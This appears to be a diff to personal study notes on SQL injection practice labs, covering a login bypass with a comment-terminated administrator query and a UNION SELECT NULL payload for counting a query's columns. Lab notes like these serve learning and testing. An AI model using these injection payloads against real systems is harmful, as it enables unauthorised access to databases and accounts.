@@ -30,3 +30,8 @@ query:- SELECT * FROM users WHERE username = 'administrator'--' AND password = '
     2. then solved
 
 -----------------------------------------------------------------------------------------
+
+#3 Lab:SQL injection UNION attack, determining the number of columns returned by the query 
+
+   1. click on category parameter
+   2. then add '+UNION+SELECT+NULL,NULL,NULL-- at the end of the category parameter until it gives column
